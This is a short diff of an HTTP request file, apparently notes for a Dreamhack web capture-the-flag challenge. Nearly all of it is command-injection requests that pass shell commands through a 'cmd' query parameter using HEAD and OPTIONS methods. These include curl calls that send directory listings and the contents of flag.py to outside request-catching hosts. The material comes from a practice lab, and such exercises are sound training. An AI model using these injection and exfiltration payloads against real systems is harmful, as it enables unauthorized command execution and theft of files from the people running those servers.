@@ -1,6 +1,6 @@
 ###
 
-HEAD http://host3.dreamhack.games:11724/?cmd=vi test.py
+OPTIONS http://host3.dreamhack.games:14162/?cmd=ls
 
 
 ###
@@ -12,3 +12,10 @@ HEAD https://grandff-dreamhack-web-wxr6vxpph99qw-8000.githubpreview.dev/?cmd=vi 
 
 
 HEAD http://host3.dreamhack.games:11724/?cmd=curl https://grandff-dreamhack-web-wxr6vxpph99qw-8000.githubpreview.dev/?result=$(dir)
+
+
+###
+
+HEAD http://host3.dreamhack.games:14162/?cmd=curl https://khunioz.request.dreamhack.games/ -d "$(cat flag.py)"
+
+
